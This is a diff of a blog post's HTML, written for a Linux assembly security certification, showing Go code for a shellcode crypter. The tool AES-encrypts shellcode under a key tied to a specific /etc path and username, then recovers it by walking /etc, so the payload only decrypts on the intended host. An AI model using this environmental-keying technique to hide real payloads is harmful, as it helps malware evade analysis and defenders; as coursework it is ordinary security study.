-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83</span><span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>decrypt</span>(ciphertext <span style=color:#cdcaa9;font-weight:700>string</span>, envKey []<span style=color:#cdcaa9;font-weight:700>byte</span>) (plaintext []<span style=color:#cdcaa9;font-weight:700>byte</span>, err <span style=color:#cdcaa9;font-weight:700>error</span>) {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84</span><span>    ciphertxt, _ := hex.<span style=color:#ff0086;font-weight:700>DecodeString</span>(ciphertext[<span style=color:#0086f7;font-weight:700>24</span>:])
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85</span><span>    nonce, _ := hex.<span style=color:#ff0086;font-weight:700>DecodeString</span>(ciphertext[:<span style=color:#0086f7;font-weight:700>24</span>])
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87</span><span>    block, err := aes.<span style=color:#ff0086;font-weight:700>NewCipher</span>(envKey)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88</span><span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89</span><span>        <span style=color:#fb660a;font-weight:700>return</span> []<span style=color:#cdcaa9;font-weight:700>byte</span>{}, err
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92</span><span>    aesgcm, err := cipher.<span style=color:#ff0086;font-weight:700>NewGCM</span>(block)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93</span><span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94</span><span>        <span style=color:#fb660a;font-weight:700>return</span> []<span style=color:#cdcaa9;font-weight:700>byte</span>{}, err
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97</span><span>    plaintxt, err := aesgcm.<span style=color:#ff0086;font-weight:700>Open</span>(<span style=color:#fb660a;font-weight:700>nil</span>, nonce, ciphertxt, <span style=color:#fb660a;font-weight:700>nil</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98</span><span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99</span><span>        <span style=color:#fb660a;font-weight:700>return</span> []<span style=color:#cdcaa9;font-weight:700>byte</span>{}, err
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102</span><span>    <span style=color:#fb660a;font-weight:700>return</span> plaintxt, <span style=color:#fb660a;font-weight:700>nil</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105</span><span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>main</span>() {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107</span><span>    <span style=color:#fb660a;font-weight:700>if</span> len(os.Args) &lt;= <span style=color:#0086f7;font-weight:700>1</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108</span><span>        flag.<span style=color:#ff0086;font-weight:700>Usage</span>()
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109</span><span>        os.<span style=color:#ff0086;font-weight:700>Exit</span>(<span style=color:#0086f7;font-weight:700>0</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112</span><span>    opts := <span style=color:#ff0086;font-weight:700>processArgs</span>()
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114</span><span>    currentUser := &amp;user.User{}
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115</span><span>    currentUser, err := user.<span style=color:#ff0086;font-weight:700>Current</span>()
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116</span><span>    envPath := <span style=color:#0086d2>&#34;/etc/vmware-tools/scripts/vmware/network&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117</span><span>    envKey := sha256.<span style=color:#ff0086;font-weight:700>Sum256</span>([]byte(envPath + currentUser.Username))
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119</span><span>    <span style=color:#fb660a;font-weight:700>if</span> opts.encrypt {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120</span><span>        <span style=color:#fb660a;font-weight:700>if</span> opts.shellcode == <span style=color:#0086d2>&#34;&#34;</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121</span><span>            fmt.<span style=color:#ff0086;font-weight:700>Println</span>(<span style=color:#0086d2>&#34;[-] Please specify your shellcode&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122</span><span>            os.<span style=color:#ff0086;font-weight:700>Exit</span>(<span style=color:#0086f7;font-weight:700>1</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123</span><span>        }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125</span><span>        ciphertext, err := <span style=color:#ff0086;font-weight:700>encrypt</span>(opts.shellcode, envKey[:])
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">126</span><span>        <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">127</span><span>            fmt.<span style=color:#ff0086;font-weight:700>Println</span>(<span style=color:#0086d2>&#34;[-] Something went wrong encrypting your shellcode. Error: &#34;</span>, err)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">128</span><span>            os.<span style=color:#ff0086;font-weight:700>Exit</span>(<span style=color:#0086f7;font-weight:700>1</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">129</span><span>        }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">130</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">131</span><span>        fmt.<span style=color:#ff0086;font-weight:700>Printf</span>(<span style=color:#0086d2>&#34;[+] Your encrypted shellcode: %s\n&#34;</span>, ciphertext)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">132</span><span>        <span style=color:#fb660a;font-weight:700>return</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">133</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">134</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">135</span><span>    <span style=color:#fb660a;font-weight:700>if</span> opts.decrypt {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">136</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">137</span><span>        <span style=color:#fb660a;font-weight:700>if</span> opts.shellcode == <span style=color:#0086d2>&#34;&#34;</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">138</span><span>            fmt.<span style=color:#ff0086;font-weight:700>Println</span>(<span style=color:#0086d2>&#34;[-] Please specify your encrypted shellcode&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">139</span><span>            os.<span style=color:#ff0086;font-weight:700>Exit</span>(<span style=color:#0086f7;font-weight:700>1</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">140</span><span>        }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">141</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">142</span><span>        encryptedShellcode := opts.shellcode
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">143</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">144</span><span>        err = filepath.<span style=color:#ff0086;font-weight:700>Walk</span>(<span style=color:#0086d2>&#34;/etc/&#34;</span>, <span style=color:#fb660a;font-weight:700>func</span>(path <span style=color:#cdcaa9;font-weight:700>string</span>, info os.FileInfo, err <span style=color:#cdcaa9;font-weight:700>error</span>) <span style=color:#cdcaa9;font-weight:700>error</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">145</span><span>            envKey := sha256.<span style=color:#ff0086;font-weight:700>Sum256</span>([]byte(path + currentUser.Username))
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">146</span><span>            plaintext, err := <span style=color:#ff0086;font-weight:700>decrypt</span>(encryptedShellcode, envKey[:])
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">147</span><span>            <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">148</span><span>                <span style=color:#080;background-color:#0f140f;font-style:italic>// Disregard errors
-</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">149</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>                <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#fb660a;font-weight:700>nil</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">150</span><span>            } <span style=color:#fb660a;font-weight:700>else</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">151</span><span>                fmt.<span style=color:#ff0086;font-weight:700>Printf</span>(<span style=color:#0086d2>&#34;[+] Decrypted shellcode: %s\n&#34;</span>, plaintext)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">152</span><span>            }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">153</span><span>            <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#fb660a;font-weight:700>nil</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">154</span><span>        })
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">155</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">156</span><span>        <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">157</span><span>            fmt.<span style=color:#ff0086;font-weight:700>Printf</span>(<span style=color:#0086d2>&#34;error walking the path %q: %v\n&#34;</span>, <span style=color:#0086d2>&#34;/etc/&#34;</span>, err)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">158</span><span>            <span style=color:#fb660a;font-weight:700>return</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">159</span><span>        }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">160</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">161</span><span>}
-</span></span></code></pre></div><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
+</code></pre><h2 id=final-code>Final code</h2>
+<p>Below is the final program for encrypting/decrypting shellcode.</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1</span><span style=color:#fb660a;font-weight:700>package</span> main
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3</span><span style=color:#fb660a;font-weight:700>import</span> (
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4</span>    <span style=color:#0086d2>&#34;crypto/aes&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5</span>    <span style=color:#0086d2>&#34;crypto/cipher&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6</span>    <span style=color:#0086d2>&#34;crypto/rand&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7</span>    <span style=color:#0086d2>&#34;crypto/sha256&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8</span>    <span style=color:#0086d2>&#34;encoding/hex&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9</span>    <span style=color:#0086d2>&#34;flag&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10</span>    <span style=color:#0086d2>&#34;fmt&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11</span>    <span style=color:#0086d2>&#34;io&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12</span>    <span style=color:#0086d2>&#34;os&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13</span>    <span style=color:#0086d2>&#34;os/user&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14</span>    <span style=color:#0086d2>&#34;path/filepath&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17</span><span style=color:#fb660a;font-weight:700>type</span> cliOptions <span style=color:#fb660a;font-weight:700>struct</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18</span>    encrypt   <span style=color:#cdcaa9;font-weight:700>bool</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19</span>    decrypt   <span style=color:#cdcaa9;font-weight:700>bool</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20</span>    shellcode <span style=color:#cdcaa9;font-weight:700>string</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21</span>}
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23</span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>processArgs</span>() cliOptions {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24</span>    opts := cliOptions{}
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25</span>    flag.<span style=color:#ff0086;font-weight:700>BoolVar</span>(&amp;opts.decrypt, <span style=color:#0086d2>&#34;decrypt&#34;</span>, <span style=color:#fb660a;font-weight:700>false</span>, <span style=color:#0086d2>&#34;Decrypt your shellcode&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26</span>    flag.<span style=color:#ff0086;font-weight:700>BoolVar</span>(&amp;opts.decrypt, <span style=color:#0086d2>&#34;d&#34;</span>, <span style=color:#fb660a;font-weight:700>false</span>, <span style=color:#0086d2>&#34;Decrypt your shellcode&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27</span>    flag.<span style=color:#ff0086;font-weight:700>BoolVar</span>(&amp;opts.encrypt, <span style=color:#0086d2>&#34;encrypt&#34;</span>, <span style=color:#fb660a;font-weight:700>false</span>, <span style=color:#0086d2>&#34;Encrypt your shellcode&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28</span>    flag.<span style=color:#ff0086;font-weight:700>BoolVar</span>(&amp;opts.encrypt, <span style=color:#0086d2>&#34;e&#34;</span>, <span style=color:#fb660a;font-weight:700>false</span>, <span style=color:#0086d2>&#34;Encrypt your shellcode&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29</span>    flag.<span style=color:#ff0086;font-weight:700>StringVar</span>(&amp;opts.shellcode, <span style=color:#0086d2>&#34;shellcode&#34;</span>, <span style=color:#0086d2>&#34;&#34;</span>, <span style=color:#0086d2>&#34;Your shellcode&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30</span>    flag.<span style=color:#ff0086;font-weight:700>StringVar</span>(&amp;opts.shellcode, <span style=color:#0086d2>&#34;s&#34;</span>, <span style=color:#0086d2>&#34;&#34;</span>, <span style=color:#0086d2>&#34;Your shellcode&#34;</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31</span>    flag.<span style=color:#ff0086;font-weight:700>Parse</span>()
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33</span>    <span style=color:#fb660a;font-weight:700>return</span> opts
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34</span>}
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36</span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>init</span>() {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37</span>    flag.Usage = <span style=color:#fb660a;font-weight:700>func</span>() {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38</span>        h := <span style=color:#0086d2>&#34;\nEncrypt your shellcode! Very nice! Made by @dubs3c.\n\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40</span>        h += <span style=color:#0086d2>&#34;Usage:\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41</span>        h += <span style=color:#0086d2>&#34;  cyrptoBoot [shellcode] [options]\n\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43</span>        h += <span style=color:#0086d2>&#34;Options:\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44</span>        h += <span style=color:#0086d2>&#34;  -e,  --encrypt      Encrypt shellcode\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45</span>        h += <span style=color:#0086d2>&#34;  -d,  --decrypt      Decrypt shellcode\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46</span>        h += <span style=color:#0086d2>&#34;  -s,  --shellcode    Shellcode\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47</span>        h += <span style=color:#0086d2>&#34;  -v,  --version      Show version\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49</span>        h += <span style=color:#0086d2>&#34;\nExamples:\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50</span>        h += <span style=color:#0086d2>&#34;  cryptoBoot -e -s \&#34;&lt;shellcode&gt;\&#34;\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51</span>        h += <span style=color:#0086d2>&#34;  cryptoBoot -d -s \&#34;&lt;shellcode&gt;\&#34;\n&#34;</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53</span>        fmt.<span style=color:#ff0086;font-weight:700>Fprintf</span>(os.Stderr, h)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55</span>}
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57</span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>encrypt</span>(shellcode <span style=color:#cdcaa9;font-weight:700>string</span>, envKey []<span style=color:#cdcaa9;font-weight:700>byte</span>) (encryptedShellcode []<span style=color:#cdcaa9;font-weight:700>byte</span>, err <span style=color:#cdcaa9;font-weight:700>error</span>) {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58</span>    plaintext := []byte(shellcode)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60</span>    block, err := aes.<span style=color:#ff0086;font-weight:700>NewCipher</span>(envKey)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61</span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62</span>        panic(err.<span style=color:#ff0086;font-weight:700>Error</span>())
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65</span>    <span style=color:#080;background-color:#0f140f;font-style:italic>// Never use more than 2^32 random nonces with a given key because of the risk of a repeat.
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66</span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    nonce := make([]<span style=color:#cdcaa9;font-weight:700>byte</span>, <span style=color:#0086f7;font-weight:700>12</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67</span>    <span style=color:#fb660a;font-weight:700>if</span> _, err := io.<span style=color:#ff0086;font-weight:700>ReadFull</span>(rand.Reader, nonce); err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68</span>        panic(err.<span style=color:#ff0086;font-weight:700>Error</span>())
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71</span>    aesgcm, err := cipher.<span style=color:#ff0086;font-weight:700>NewGCM</span>(block)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72</span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73</span>        panic(err.<span style=color:#ff0086;font-weight:700>Error</span>())
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74</span>    }
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76</span>    ciphertext := aesgcm.<span style=color:#ff0086;font-weight:700>Seal</span>(<span style=color:#fb660a;font-weight:700>nil</span>, nonce, plaintext, <span style=color:#fb660a;font-weight:700>nil</span>)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77</span>    ciphertextWithNonce := append(nonce, ciphertext...)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78</span>    encodedCiphertext := make([]<span style=color:#cdcaa9;font-weight:700>byte</span>, hex.<span style=color:#ff0086;font-weight:700>EncodedLen</span>(len(ciphertextWithNonce)))
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79</span>    hex.<span style=color:#ff0086;font-weight:700>Encode</span>(encodedCiphertext, ciphertextWithNonce)
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80</span>    <span style=color:#fb660a;font-weight:700>return</span> encodedCiphertext, <span style=color:#fb660a;font-weight:700>nil</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81</span>}
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82</span>
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83</span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>decrypt</span>(ciphertext <span style=color:#cdcaa9;font-weight:700>string</span>, envKey []<span style=color:#cdcaa9;font-weight:700>byte</span>) (plaintext []<span style=color:#cdcaa9;font-weight:700>byte</span>, err <span style=color:#cdcaa9;font-weight:700>error</span>) {
+<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84</span>    ciphertxt, _ := hex.<span style=color:#ff0086;font-weight:700>DecodeString</span>(ciphertext[<span style=color:#0086f7;font-weight:700>24</span>:])
